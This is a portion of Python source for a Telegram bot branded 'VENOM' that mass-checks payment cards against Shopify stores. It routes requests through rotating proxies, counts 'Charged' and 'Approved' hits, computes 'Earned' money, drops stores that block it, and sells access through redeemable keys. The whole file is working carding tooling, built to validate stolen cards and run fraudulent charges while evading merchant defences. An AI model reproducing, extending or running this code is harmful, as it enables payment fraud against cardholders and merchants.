    filled       = int(BAR_WIDTH * checked / total) if total else 0
    bar_fill     = "\u2588" * filled + "\u2591" * (BAR_WIDTH - filled)
    bar_line     = f"{bar_fill}  {pct}%"
    PROG_SEP     = "\u25b0" * 20
    EM_TOTAL     = '<tg-emoji emoji-id="5298970748172385213">\u2b50</tg-emoji>'
    EM_CHECKED   = '<tg-emoji emoji-id="6267229004311303657">\u2b50</tg-emoji>'
    EM_APPR      = '<tg-emoji emoji-id="6267118537752450044">\u2b50</tg-emoji>'
    EM_CHARG     = '<tg-emoji emoji-id="6266905086467773719">\u2b50</tg-emoji>'
    EM_DECL      = '<tg-emoji emoji-id="6264989883241076562">\u2b50</tg-emoji>'
    EM_ERR       = '<tg-emoji emoji-id="6267039884016358504">\u2b50</tg-emoji>'
    declined_cnt = len([r for r in dead_list if not r.get('retry', False)])

    # ── last card info (from all_results dict) ────────────────────────────────
    last_card_txt = html.escape(str(results.get('last_card', '—')))
    last_resp_txt = html.escape(str(results.get('last_resp', '—'))[:45])
    last_gate_txt = html.escape(str(results.get('last_gate', '—')))

    # ── auto-removed sites count ──────────────────────────────────────────────
    removed_ct   = len(results.get('auto_removed_sites', []))
    removed_line = f"\n🗑  <b>Auto-removed</b>  ⟶  {removed_ct} site(s)" if removed_ct else ""

    latest = ""
    if last_res:
        se = "\U0001f525" if last_res['status'] == 'Charged' else ("\u2705" if last_res['status'] == 'Approved' else "\U0001f6ab")
        latest = (
            f"\n<b>{'-' * 20}</b>\n"
            f"\u26a1 <b>Latest:</b> {se} "
            f"<tg-spoiler><code>{last_card_txt}</code></tg-spoiler>\n"
            f"\u21b3 <i>{last_resp_txt}</i>\n"
            f"\U0001f3e6 <i>{last_gate_txt}</i>"
        )

    text = (
        f"\u2b50 <b>{fi('Shopify Mass Check')}</b>\n"
        f"<b>{PROG_SEP}</b>\n"
        f"  <code>{bar_line}</code>\n\n"
        f"{EM_TOTAL}  <b>{fi('Total')}</b>      \u27b6  {total}\n"
        f"{EM_CHECKED}  <b>{fi('Checked')}</b>    \u27b6  {checked}\n"
        f"{EM_APPR}  <b>{fi('Approved')}</b>   \u27b6  {ap_cnt}\n"
        f"{EM_DECL}  <b>{fi('Declined')}</b>   \u27b6  {declined_cnt}\n"
        f"{EM_CHARG}  <b>{fi('Charged')}</b>    \u27b6  {ch_cnt}\n"
        f"{EM_ERR}  <b>{fi('Errors')}</b>     \u27b6  {err_cnt}"
        f"{removed_line}\n"
        f"<b>{PROG_SEP}</b>"
        f"{latest}"
    )
    await raw_edit(user_id, message_id, text, rows_stop())

async def send_final_results(user_id, results):
    # ── حساب الوقت ──────────────────────────────────────────────────────────
    elapsed      = int(time.time() - results['start_time'])
    h, m, s      = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    time_str     = f"{h:02d}:{m:02d}:{s:02d}"

    # ── إحصاءات أساسية ──────────────────────────────────────────────────────
    total        = results.get('total', 0)
    ch_count     = len(results.get('charged', []))
    ap_count     = len(results.get('approved', []))
    dead_list    = results.get('dead', [])
    dead_count   = len(dead_list)
    checked      = ch_count + ap_count + dead_count

    # declined = dead cards that got a real card decline (not site/proxy errors)
    declined_list  = [r for r in dead_list if not r.get('retry', False)]
    declined_count = len(declined_list)

    # errored = separate bucket filled by run_mass_check (site/proxy/timeout)
    errored_list = results.get('errored', [r for r in dead_list if r.get('retry', False)])
    error_count  = len(errored_list)
    checked      = ch_count + ap_count + dead_count + error_count

    # auto-removed sites
    auto_removed   = results.get('auto_removed_sites', [])
    removed_line   = f"\n🗑  <b>Auto-removed</b>  ⟶  {len(auto_removed)} site(s)" if auto_removed else ""

    # ── حساب الأرباح (Earned) — متوسط سعر المنتج × عدد الـ Charged ─────────
    prices = []
    for r in results.get('charged', []):
        try:
            p = float(str(r.get('price', '0')).replace('$', '').strip())
            if p > 0:
                prices.append(p)
        except (ValueError, TypeError):
            pass
    if prices:
        avg_price  = sum(prices) / len(prices)
        earned_val = avg_price * ch_count
    else:
        # fallback: محاولة من approved أيضاً
        for r in results.get('approved', []):
            try:
                p = float(str(r.get('price', '0')).replace('$', '').strip())
                if p > 0:
                    prices.append(p)
            except (ValueError, TypeError):
                pass
        avg_price  = (sum(prices) / len(prices)) if prices else 0.0
        earned_val = avg_price * ch_count
    earned_str = f"${earned_val:.2f}"

    # ── شريط التقدم الكامل 100% ─────────────────────────────────────────────
    full_bar  = "██████████████████"   # 18 بلوك = 100%
    bar_line  = f"{full_bar}  100%"

    # ── الفاصل الأنيق ───────────────────────────────────────────────────────
    FINAL_SEP = "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"

    # ── IDs الإيموجيات Premium ──────────────────────────────────────────────
    EM_TOTAL   = '<tg-emoji emoji-id="5298970748172385213">⭐</tg-emoji>'
    EM_CHECKED = '<tg-emoji emoji-id="6267229004311303657">⭐</tg-emoji>'
    EM_APPR    = '<tg-emoji emoji-id="6267118537752450044">⭐</tg-emoji>'
    EM_DECL    = '<tg-emoji emoji-id="6264989883241076562">⭐</tg-emoji>'
    EM_CHARG   = '<tg-emoji emoji-id="6266905086467773719">⭐</tg-emoji>'
    EM_EARNED  = '<tg-emoji emoji-id="6267068789146260253">⭐</tg-emoji>'
    EM_ERROR   = '<tg-emoji emoji-id="6267039884016358504">⭐</tg-emoji>'

    # ── تسجيل الإحصاءات ────────────────────────────────────────────────────
    cname, cusername = await get_display_info(user_id)
    record_mass_check(user_id, cname, ch_count, ap_count, dead_count, username=cusername)
    for r in results.get('charged', []):
        record_log(user_id, cname, cusername, r.get('card', ''), 'Charged',
                   r.get('message', ''), r.get('site', ''),
                   r.get('gateway', 'Shopify Payments'), r.get('price', '-'))
    for r in results.get('approved', []):
        record_log(user_id, cname, cusername, r.get('card', ''), 'Approved',
                   r.get('message', ''), r.get('site', ''),
                   r.get('gateway', 'Shopify Payments'), r.get('price', '-'))

    # ── بناء رسالة النتائج النهائية ─────────────────────────────────────────
    summary = (
        f"⭐ <b>{fi('Check Finished')}</b> ⭐\n"
        f"<b>{FINAL_SEP}</b>\n"
        f"  <code>{bar_line}</code>\n\n"
        f"{EM_TOTAL}  <b>{fi('Total')}</b>      ⟶  {total}\n"
        f"{EM_CHECKED}  <b>{fi('Checked')}</b>    ⟶  {checked}\n"
        f"{EM_APPR}  <b>{fi('Approved')}</b>   ⟶  {ap_count}\n"
        f"{EM_DECL}  <b>{fi('Declined')}</b>   ⟶  {declined_count}\n"
        f"{EM_CHARG}  <b>{fi('Charged')}</b>    ⟶  {ch_count}\n"
        f"{EM_EARNED}  <b>{fi('Earned')}</b>     ⟶  {earned_str}\n"
        f"{EM_ERROR}  <b>{fi('Errors')}</b>     ⟶  {error_count}"
        f"{removed_line}\n"
        f"<b>{FINAL_SEP}</b>\n"
        f"⭐ <b>{fi('Time')}</b>       ⟶  {time_str}\n"
        f"<b>{FINAL_SEP}</b>\n"
        f"⭐ <b>{fi('Powered by')}</b> @{OWNER_USERNAME}"
    )
    await bot.send_message(user_id, summary, parse_mode='html')

    # ── إرسال ملف Charged ───────────────────────────────────────────────────
    if results.get('charged'):
        async with aiofiles.open("charged.txt", 'w') as f:
            await f.write(f"═══ {BOT_BRAND} — CHARGED HITS ═══\n\n")
            for r in results['charged']:
                await f.write(
                    f"{r['card']} | {r.get('gateway', '?')} | "
                    f"{r.get('price', '-')} | {r['message'][:80]}\n"
                )
        await bot.send_file(
            user_id, "charged.txt",
            caption=pe(f"🥇 <b>{fi('Charged Hits')} [{ch_count}]</b>\n{DEV_LINE}"),
            parse_mode='html'
        )
        try: os.remove("charged.txt")
        except: pass

    # ── إرسال ملف Approved ──────────────────────────────────────────────────
    if results.get('approved'):
        async with aiofiles.open("approved.txt", 'w') as f:
            await f.write(f"═══ {BOT_BRAND} — APPROVED HITS ═══\n\n")
            for r in results['approved']:
                await f.write(
                    f"{r['card']} | {r.get('gateway', '?')} | "
                    f"{r.get('price', '-')} | {r['message'][:80]}\n"
                )
        await bot.send_file(
            user_id, "approved.txt",
            caption=pe(f"✅ <b>{fi('Approved Hits')} [{ap_count}]</b>\n{DEV_LINE}"),
            parse_mode='html'
        )
        try: os.remove("approved.txt")
        except: pass

    # ── إرسال ملف Errors ────────────────────────────────────────────────────
    if errored_list:
        async with aiofiles.open("errors.txt", 'w') as f:
            await f.write(f"═══ {BOT_BRAND} — ERRORS / SITE FAILURES ═══\n\n")
            for r in errored_list:
                await f.write(f"{r['card']} | {r.get('site','-')} | {r.get('message', '?')[:100]}\n")
        await bot.send_file(
            user_id, "errors.txt",
            caption=pe(f"⚠️ <b>{fi('Errors / Site Failures')} [{error_count}]</b>\n{DEV_LINE}"),
            parse_mode='html'
        )
        try: os.remove("errors.txt")
        except: pass

async def run_mass_check(user_id, cards, progress_msg_id, random_sites: bool = False):
    session_key = f"{user_id}_{progress_msg_id}"
    active_sessions[session_key] = {'paused': False}
    all_results = {
        'charged': [], 'approved': [], 'dead': [], 'errored': [], 'tds': [],
        'total': len(cards), 'start_time': time.time(), 'last_card_time': time.time(),
        'last_card': '—', 'last_resp': '—', 'last_gate': '—',
        'auto_removed_sites': [],
    }
    _all_sites_pool = load_sites()   # full pool for random mode
    try:
        queue       = asyncio.Queue()
        last_update = [time.time()]
        for c in cards: queue.put_nowait(c)

        # ── SmartProxyRotator: round-robin with cooldown on bad proxies ──────
        _init_proxies = get_proxies_for_user(user_id) or load_proxies()
        rotator = SmartProxyRotator(_init_proxies)

        # ── Per-site consecutive error counter (shared across workers) ───────
        site_err_count: dict = {}
        active_sites: list   = list(load_sites_for_user(user_id)[0] if not random_sites else _all_sites_pool)

        async def worker():
            nonlocal active_sites
            while not queue.empty() and session_key in active_sessions:
                sess = active_sessions.get(session_key)
                if not sess: break
                while sess.get('paused', False):
                    await asyncio.sleep(1)
                    sess = active_sessions.get(session_key)
                    if not sess: return
                try:   card = queue.get_nowait()
                except asyncio.QueueEmpty: break

                # Hot-reload proxies so newly added proxies are picked up
                fresh_proxies = get_proxies_for_user(user_id) or load_proxies()
                if fresh_proxies:
                    rotator.reload(fresh_proxies)

                # ── Pick proxy via SmartProxyRotator ─────────────────────────
                proxy_raw = rotator.get()
                if not proxy_raw and fresh_proxies:
                    proxy_raw = random.choice(fresh_proxies)
                cur_proxies = [proxy_raw] if proxy_raw else (fresh_proxies or [])

                # ── Pick site ─────────────────────────────────────────────────
                if random_sites and _all_sites_pool:
                    cur_sites = [random.choice(_all_sites_pool)]
                else:
                    cur_sites = list(active_sites) if active_sites else (load_sites_for_user(user_id)[0] or [])

                if not cur_sites: break

                t0  = time.time()
                try:
                    res = await asyncio.wait_for(
                        check_card_with_retry(card, cur_sites, cur_proxies, max_retries=2),
                        timeout=180  # رُفع من 90 إلى 180 ثانية: يمنع انتهاء المهلة قبل اكتمال عملية الدفع
                    )
                except asyncio.TimeoutError:
                    # retry سريع بدون بروكسي عند انتهاء المهلة
                    try:
                        avail_retry = list(active_sites) if active_sites else cur_sites
                        if avail_retry:
                            res = await asyncio.wait_for(
                                check_card_with_retry(card, avail_retry, [], max_retries=1),
                                timeout=45
                            )
                        else:
                            res = _make_result(card, 'Dead', 'Card check timed out')
                    except Exception:
                        res = _make_result(card, 'Dead', 'Card check timed out')

                all_results['last_card_time'] = t0
                all_results['last_card']      = card
                all_results['last_resp']      = str(res.get('message', ''))[:50]
                all_results['last_gate']      = res.get('gateway', '—')

                # ── Update proxy reputation ───────────────────────────────────
                if proxy_raw:
                    msg_lower_rep = str(res.get('message', '')).lower()
                    if res.get('retry') or 'timed out' in msg_lower_rep or 'proxy' in msg_lower_rep:
                        rotator.mark_failure(proxy_raw)
                    else:
                        rotator.mark_success(proxy_raw)

                # ── Auto-remove sites with repeated errors ────────────────────
                res_site = res.get('site', '')
                if res_site and res.get('retry'):
                    site_err_count[res_site] = site_err_count.get(res_site, 0) + 1
                    if (site_err_count[res_site] >= SITE_ERROR_THRESHOLD
                            and res_site in active_sites
                            and res_site not in all_results['auto_removed_sites']):
                        try:
                            active_sites.remove(res_site)
                        except ValueError:
                            pass
                        all_results['auto_removed_sites'].append(res_site)

                # ── Classify & record ─────────────────────────────────────────
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged')
                    update_site_meta([res])
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved')
                    update_site_meta([res])
                elif res.get('retry'):
                    all_results['errored'].append(res)
                else:
                    all_results['dead'].append(res)

                queue.task_done()
                checked = (len(all_results['charged']) + len(all_results['approved'])
                           + len(all_results['dead']) + len(all_results['errored']))
                now = time.time()
                if now - last_update[0] >= 1.0:
                    last_update[0] = now
                    if session_key in active_sessions:
                        try: await update_mass_progress(user_id, progress_msg_id, all_results, checked, res)
                        except: pass

        workers = [asyncio.create_task(worker()) for _ in range(15)]  # توازن بين السرعة والاستقرار
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done(): w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
    except Exception as e:
        await bot.send_message(user_id, pe(f"⚠️ Error: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions: del active_sessions[session_key]
        try:
            await asyncio.to_thread(_raw_post, f"{TG_API}/deleteMessage",
                {"chat_id": user_id, "message_id": progress_msg_id})
        except: pass
        await send_final_results(user_id, all_results)

# ══════════════════════════════════════════════════════════════════════════════
# BOT COMMAND REGISTRATION
# ══════════════════════════════════════════════════════════════════════════════
def _register_commands():
    user_commands = [
        {"command": "start",          "description": "🚀 Start the bot"},
        {"command": "sh",             "description": "💳 Single card check"},
        {"command": "msh",            "description": "🔥 Mass check (reply to .txt)"},
        {"command": "chk",            "description": "⚡ Mass check alias"},
        {"command": "setproxy",       "description": "🔌 Set your personal proxy (single)"},
        {"command": "addproxy",       "description": "➕ Add proxy — inline or reply .txt file"},
        {"command": "uploadproxy",    "description": "📁 Upload proxy list via .txt file"},
        {"command": "myproxies",      "description": "🔌 View & manage your personal proxy pool"},
        {"command": "clearuserproxy", "description": "🗑 Clear your entire proxy pool"},
        {"command": "chkproxy",       "description": "✅ Test a proxy"},
        {"command": "myplan",         "description": "📋 Check your plan/status"},
        {"command": "redeem",         "description": "🔑 Redeem an access key"},
        {"command": "setamount",      "description": "💰 Set site amount filter ($1/$5/$10/$20/Any)"},
        {"command": "ran",            "description": "🎲 Check on a random site from full pool"},
        {"command": "mcancel",        "description": "🛑 Cancel active mass check"},
        {"command": "profile",        "description": "👤 View your profile & stats"},
        {"command": "mysites",        "description": "🌐 View your sites list with metadata"},
    ]
    admin_commands = user_commands + [
        {"command": "admin",          "description": "👑 Admin panel"},
        {"command": "genkeys",        "description": "🔑 Generate access keys"},
        {"command": "listkeys",       "description": "📋 List all keys"},
        {"command": "delkey",         "description": "🔥 Delete a key"},
        {"command": "authuser",       "description": "✅ Auth a user (grant access)"},
        {"command": "deauthuser",     "description": "❌ Deauth a user"},
        {"command": "addpremium",     "description": "✅ Add legacy premium user"},
        {"command": "rmpremium",      "description": "🔥 Remove premium user"},
        {"command": "listpremium",    "description": "📋 List premium users"},
        {"command": "userstatus",     "description": "📊 View all user statuses"},
        {"command": "addsite",        "description": "✅ Add a site"},
        {"command": "rmsite",         "description": "🔥 Remove a site"},
        {"command": "listsites",      "description": "📋 List all sites"},
        {"command": "site",           "description": "🌐 Check site health"},
        {"command": "addproxy",       "description": "✅ Add proxy to pool"},
        {"command": "rmproxy",        "description": "🔥 Remove proxy from pool"},
        {"command": "clearproxy",     "description": "🧹 Clear proxy pool"},
        {"command": "getproxy",       "description": "📋 Get proxy pool"},
        {"command": "proxy",          "description": "⚡ Check all proxies health"},
        {"command": "getuserproxy",   "description": "👤 Get user proxy"},
        {"command": "getworkingproxy","description": "✅ Get working proxies"},
        {"command": "clearworkingproxy","description":"🧹 Clear working proxies"},
        {"command": "setadmin",       "description": "👑 Manage admins"},
        {"command": "broadcast",      "description": "📡 Broadcast to all users"},
        {"command": "testcards",      "description": "🧪 Test result card designs"},
        {"command": "tagsite",        "description": "🏷 Tag site with price tier"},
        {"command": "stats",          "description": "📊 Bot statistics"},
        {"command": "getsites",       "description": "📁 Download all sites as file"},
        {"command": "addsub",         "description": "📢 Add mandatory subscription channel"},
        {"command": "rmsub",          "description": "🗑 Remove mandatory subscription channel"},
        {"command": "listsubs",       "description": "📋 List mandatory subscription channels"},
    ]
    try:
        _raw_post(f"{TG_API}/setMyCommands", {"commands": user_commands})
        for admin_id in ADMIN_IDS:
            _raw_post(f"{TG_API}/setMyCommands", {
                "commands": admin_commands,
                "scope": {"type": "chat", "chat_id": admin_id}
            })
    except:
        pass

# ─── /start ────────────────────────────────────────────────────────────────────
WELCOME_GIF = os.path.join(os.path.dirname(__file__), 'welcome.gif')

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid      = event.sender_id
    chat_id  = event.chat_id
    in_group = (chat_id != uid)
    if not in_group:
        try:
            rm_msg = await bot.send_message(uid, "\u200b", buttons=Button.clear())
            await asyncio.sleep(0.3)
            await bot.delete_messages(uid, rm_msg.id)
        except Exception:
            pass
    # ── Mandatory subscription gate ──
    if not await enforce_subscription(event):
        return
    try:
        sender    = await bot.get_entity(uid)
        username  = f"@{sender.username}" if sender.username else f"ID:{uid}"
        firstname = sender.first_name or "User"
    except:
        username  = f"ID:{uid}"
        firstname = "User"
    tier    = get_user_tier(uid)
    trem    = time_remaining(uid)
    if is_admin(uid):          status_line = "👑 Admin"
    elif tier == "auth":       status_line = f"✅ Auth — {trem} left"   if trem else "⚠️ Auth Expired"
    elif tier == "grant":      status_line = f"💎 Grant — {trem} left"  if trem else "⚠️ Grant Expired"
    elif tier == "key":        status_line = f"🔑 Key — {trem} left"    if trem else "⚠️ Key Expired"
    elif tier:                 status_line = "⭐ Premium"
    else:                      status_line = "🚫 No Access"
    lim = get_user_limit(uid)
    caption = pe(
        f"<b>VENOM</b>\n"
        f"<b>{SEP}</b>\n"
        f"👤 <b>{fi('User')}:</b> {firstname}\n"
        f"🔗 <b>{fi('Handle')}:</b> {username}\n"
        f"🆔 <b>{fi('ID')}:</b> <code>{uid}</code>\n"
        f"<b>{SEP}</b>\n"
        f"⚡ <b>{fi('Status')}:</b> {status_line}\n"
        f"📋 <b>{fi('Limit')}:</b> {lim if lim else 'N/A'} cards/file\n"
        f"<b>{SEP}</b>\n"
        f"🃏 <b>{fi('Single')}:</b> <code>/sh card|mm|yy|cvv</code>\n"
        f"🔥 <b>{fi('Mass')}:</b> Reply to .txt ➜ <code>/msh</code>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    kb_rows = rows_main()
    if is_admin(uid):
        kb_rows = [
            [{"text": "🏧  Gates",       "callback_data": "gates"},
             {"text": "👑  Admin Panel", "callback_data": "admin_panel"}],
            [{"text": "💙  Contact", "url": f"https://t.me/{OWNER_USERNAME}"},
             {"text": "❌  Close",   "callback_data": "close"}],
        ]
    try:
        if os.path.exists(WELCOME_GIF):
            msg = await raw_send(chat_id, caption, kb_rows)
            if not msg:
                await bot.send_file(chat_id, WELCOME_GIF, caption=caption, parse_mode='html')
        else:
            await raw_send(chat_id, caption, kb_rows)
    except Exception:
        await raw_send(chat_id, caption, kb_rows)

# ─── /sh — single card check ───────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def single_check(event):
    uid = event.sender_id
    if not await enforce_subscription(event): return
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Access Denied.</b> Use /redeem to activate a key."), parse_mode='html'); return
    card_raw = event.message.text.split(None, 1)[1].strip()
    cards = extract_cc(card_raw)
    if not cards:
        await event.reply(pe("❌ <b>Invalid card format.</b>\n\nUse: <code>/sh 4111111111111111|12|2026|123</code>"), parse_mode='html'); return
    card    = cards[0]
    sites, _eff_tier = load_sites_for_user(uid)
    proxies = get_proxies_for_user(uid) or load_proxies()
    _tier        = get_user_amount_tier(uid)
    _range_label = tier_range_label(_eff_tier)
    if not sites:
        await event.reply(pe("❌ <b>No sites configured.</b> Contact admin."), parse_mode='html'); return
    if not proxies: await event.reply(pe("❌ <b>No proxy set!</b>\n\nSet your proxy:\n<code>/setproxy ip:port</code>"), parse_mode='html'); return
    _filter_line = f"💰 <b>Filter:</b> {_range_label}\n" if _eff_tier != 'any' else ""
    smsg = await event.reply(pe(
        f"<b>⚡ {fi('Checking')}...</b>\n"
        f"<b>{SEP}</b>\n"
        f"🃏 <code>{card}</code>\n"
        f"{_filter_line}"
    ), parse_mode='html')
    try:
        result, bin_info, (cname, cusername) = await asyncio.gather(
            check_card_with_retry(card, sites, proxies, max_retries=1, max_proxy_tries=2),
            get_bin_info(card.split('|')[0]),
            get_display_info(uid),
        )
        resp = build_result_card(result, bin_info, uid, cname)
        await smsg.edit(resp, parse_mode='html')
        record_check(uid, cname, result.get('status', 'Dead'), username=cusername)
        record_log(uid, cname, cusername,
                   result.get('card', card),
                   result.get('status', 'Dead'),
                   result.get('message', ''),
                   result.get('site', ''),
                   result.get('gateway', 'Shopify Payments'),
                   result.get('price', '-'))
        if result.get('status') == 'Charged':
            try: await bot.pin_message(uid, smsg.id, notify=True)
            except: pass
        if result.get('status') in ('Charged', 'Approved'):
            asyncio.create_task(notify_admins_hit(uid, result, bin_info, cname))
    except Exception as e:
        await smsg.edit(pe(f"❌ Error: {e}"), parse_mode='html')

# ─── /setproxy ─────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/setproxy(\s+.+)?$'))
async def setproxy_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Access Denied.</b>"), parse_mode='html'); return
    args = event.message.text.split(None, 1)
    if len(args) < 2 or not args[1].strip():
        curr = get_user_proxy(uid) or "Not set"
        await event.reply(pe(
            f"<b>⚙️ Your Proxy</b>\n<b>{SEP}</b>\n"
            f"🔌 <b>Current:</b> <code>{curr}</code>\n\n"
            f"👩‍💻 <b>To Set:</b>\n"
            f"<code>/setproxy ip:port</code>\n"
            f"<code>/setproxy ip:port:user:pass</code>\n"
            f"<code>/setproxy socks5://ip:port</code>\n\n"
            f"📁 <b>Upload file:</b> Send a <code>.txt</code> file and reply with <code>/uploadproxy</code>\n"
            f"To clear: <code>/clearuserproxy</code>"
        ), parse_mode='html'); return
    proxy = args[1].strip()
    set_user_proxy(uid, proxy)
    await event.reply(pe(f"✅ <b>Proxy Set!</b>\n🔌 <code>{proxy}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearuserproxy$'))
async def clearuserproxy_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Access Denied.</b>"), parse_mode='html'); return
    count = len(get_user_proxy_list(uid))
    clear_user_proxies(uid)
    await event.reply(pe(
        f"✅ <b>Your proxy pool cleared!</b>\n"
        f"🗑 Removed <b>{count}</b> {'proxy' if count == 1 else 'proxies'}."
    ), parse_mode='html')

# ─── /myproxies — view & manage personal proxy pool ────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/myproxies(\s+.*)?$'))
async def myproxies_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Access Denied.</b>"), parse_mode='html'); return

    parts = event.message.text.strip().split(None, 2)
    sub   = parts[1].lower() if len(parts) > 1 else None

    # ── /myproxies rm <proxy> ────────────────────────────────────────────
    if sub == 'rm' and len(parts) > 2:
        target = parts[2].strip()
        removed = remove_user_proxy_entry(uid, target)
        total_now = len(get_user_proxy_list(uid))
        if removed:
            await event.reply(pe(
                f"✅ <b>Proxy removed!</b>\n<code>{html.escape(target)}</code>\n"
                f"🔌 <b>Pool now:</b> {total_now} proxies"
            ), parse_mode='html')
        else:
            await event.reply(pe(f"❌ Not found in your pool:\n<code>{html.escape(target)}</code>"), parse_mode='html')
        return

    # ── /myproxies clear ─────────────────────────────────────────────────
    if sub == 'clear':
        count = len(get_user_proxy_list(uid))
        clear_user_proxies(uid)
        await event.reply(pe(f"🗑 <b>Cleared {count} {'proxy' if count==1 else 'proxies'} from your pool.</b>"), parse_mode='html')
        return

    # ── default: list ────────────────────────────────────────────────────
    lst = get_user_proxy_list(uid)
    if not lst:
        await event.reply(pe(
            f"❌ <b>Your proxy pool is empty.</b>\n\n"
            f"Add proxies:\n"
            f"<code>/addproxy ip:port</code>\n"
            f"Or reply to a <code>.txt</code> file with <code>/addproxy</code>"
        ), parse_mode='html')
        return

    if len(lst) <= 20:
        lines = "\n".join(f"{i+1}. <code>{html.escape(p)}</code>" for i, p in enumerate(lst))
        await event.reply(pe(
            f"🔌 <b>Your Proxy Pool ({len(lst)}):</b>\n"
            f"<b>{SEP}</b>\n{lines}\n<b>{SEP}</b>\n"
            f"<code>/myproxies rm ip:port</code> — remove one\n"
            f"<code>/myproxies clear</code> — wipe all"
        ), parse_mode='html')
    else:
        # big pool → send as file
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn   = f"my_proxies_{uid}_{ts}.txt"
        async with aiofiles.open(fn, 'w') as f:
            for i, p in enumerate(lst, 1):
                await f.write(f"{i}. {p}\n")
        await event.reply(
            pe(f"🔌 <b>Your Proxy Pool ({len(lst)} proxies)</b>"),
            file=fn, parse_mode='html'
        )
        try: os.remove(fn)
        except: pass

# ─── /uploadproxy — upload proxy list via .txt file (users + admins) ───────────
# HOW IT WORKS:
#   • Admins:  file is merged into the GLOBAL proxy pool (proxies.txt)
#   • Users:   first valid proxy in the file is set as their PERSONAL proxy
#              (users only get one proxy slot — the first good line wins)
# Usage: send a .txt file then reply to it with /uploadproxy
#        OR attach the file directly with /uploadproxy as caption
@bot.on(events.NewMessage(pattern=r'^/uploadproxy$'))
async def uploadproxy_command(event):
    uid = event.sender_id

    # ── access gate: must be at least a regular authed user ─────────────────
    if not is_premium(uid):
        await event.reply(pe("❌ <b>Access Denied.</b>"), parse_mode='html')
        return

    # ── resolve the document: either a reply or a direct attachment ─────────
    doc_msg = None
    reply   = await event.get_reply_message()
    if reply and reply.document:
        doc_msg = reply
    elif event.message.document:
        doc_msg = event.message

    if not doc_msg:
        await event.reply(pe(
            f"<b>📁 Upload Proxy File</b>\n"
            f"<b>{SEP}</b>\n"
            f"Send a <code>.txt</code> file containing proxies (one per line),\n"
            f"then reply to it with <code>/uploadproxy</code>.\n\n"
            f"<b>Formats accepted:</b>\n"
            f"<code>ip:port</code>\n"
            f"<code>ip:port:user:pass</code>\n"
            f"<code>socks5://ip:port</code>\n"
            f"<code>http://user:pass@ip:port</code>\n\n"
            f"{'👑 <b>Admin:</b> All valid proxies are added to the global pool.' if is_admin(uid) else '👤 <b>User:</b> The first valid proxy becomes your personal proxy.'}"
        ), parse_mode='html')
        return

    # ── validate file type ────────────────────────────────────────────────────
    attrs  = doc_msg.document.attributes or []
    fname  = getattr(attrs[0], 'file_name', '') if attrs else ''
    mime   = doc_msg.document.mime_type or ''
    if not (fname.lower().endswith('.txt') or mime == 'text/plain'):
        await event.reply(pe("❌ <b>Only <code>.txt</code> files are accepted.</b>"), parse_mode='html')
        return

    # ── size guard: 2 MB max ─────────────────────────────────────────────────
    MAX_BYTES = 2 * 1024 * 1024
    if doc_msg.document.size > MAX_BYTES:
        await event.reply(pe("❌ <b>File too large.</b> Max 2 MB."), parse_mode='html')
        return

    # ── download & parse ──────────────────────────────────────────────────────
    smsg = await event.reply(pe("⏳ <b>Reading file…</b>"), parse_mode='html')
    try:
        buf = await doc_msg.download_media(bytes)
    except Exception as e:
        await smsg.edit(pe(f"❌ <b>Download failed:</b> <code>{html.escape(str(e)[:120])}</code>"), parse_mode='html')
        return

    raw_lines = buf.decode('utf-8', errors='ignore').splitlines()

    # ── normalise & validate every proxy line ────────────────────────────────
    def _is_valid_proxy(p: str) -> bool:
        """Light-weight structural validation — not a live test."""
        p = p.strip()
        if not p or p.startswith('#'):
            return False
        # scheme-prefixed  (socks5:// / http:// / https://)
        if '://' in p:
            return bool(re.match(
                r'^(socks5|socks4|http|https)://[^\s@:]+(?::[^\s@]+)?@?[^\s:]+:\d{1,5}$', p, re.I
            ))
        # bare  ip:port  or  ip:port:user:pass
        parts = p.split(':')
        if len(parts) in (2, 4):
            return parts[-1].isdigit() if len(parts) == 2 else parts[1].isdigit()
        return False

    valid_proxies   = [l.strip() for l in raw_lines if _is_valid_proxy(l.strip())]
    invalid_count   = len(raw_lines) - len([l for l in raw_lines if l.strip()])  # blank lines
    rejected_count  = len([l for l in raw_lines if l.strip() and not _is_valid_proxy(l.strip())])

    if not valid_proxies:
        await smsg.edit(pe(
            f"❌ <b>No valid proxies found in file.</b>\n"
            f"📄 Lines read: <b>{len(raw_lines)}</b>\n"
            f"🚫 Rejected (bad format): <b>{rejected_count}</b>\n\n"
            f"Expected formats:\n"
            f"<code>ip:port</code> or <code>ip:port:user:pass</code> or <code>socks5://ip:port</code>"
        ), parse_mode='html')
        return

    # ── ADMIN PATH: merge into global pool ───────────────────────────────────
    if is_admin(uid):
        existing = set(load_proxies())
        new_entries = [p for p in valid_proxies if p not in existing]
        duplicates  = len(valid_proxies) - len(new_entries)

        if new_entries:
            async with aiofiles.open(PROXY_FILE, 'a') as f:
                for p in new_entries:
                    await f.write(f"{p}\n")

        pool_total = len(load_proxies())
        await smsg.edit(pe(
            f"✅ <b>Proxy Pool Updated!</b>\n"
            f"<b>{SEP}</b>\n"
            f"📄 <b>File:</b> <code>{html.escape(fname or 'proxies.txt')}</code>\n"
            f"📋 <b>Lines read:</b> {len(raw_lines)}\n"
            f"✅ <b>Valid:</b> {len(valid_proxies)}\n"
            f"➕ <b>Added:</b> {len(new_entries)}\n"
            f"♻️ <b>Duplicates skipped:</b> {duplicates}\n"
